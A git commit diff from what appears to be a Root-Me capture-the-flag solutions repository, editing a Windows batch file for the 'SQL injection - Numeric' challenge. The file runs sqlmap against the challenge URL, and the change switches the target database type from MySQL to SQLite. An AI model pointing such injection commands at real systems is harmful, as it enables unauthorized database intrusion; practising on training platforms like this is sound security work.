b1e38a11dcb6471a4d27cc13cf4c252e640dcf27
Thampakon <119696243+Thampakon@users.noreply.github.com>
2023-09-10 04:33:36 +0700

    Update windows.bat

--- root-me/Web - Server/SQL injection - Numeric/windows.bat
+++ root-me/Web - Server/SQL injection - Numeric/windows.bat
@@ -1,4 +1,4 @@
 @echo off
 
-python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2" --dbms=mysql --batch
+python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2" --dbms=SQLite --batch
 
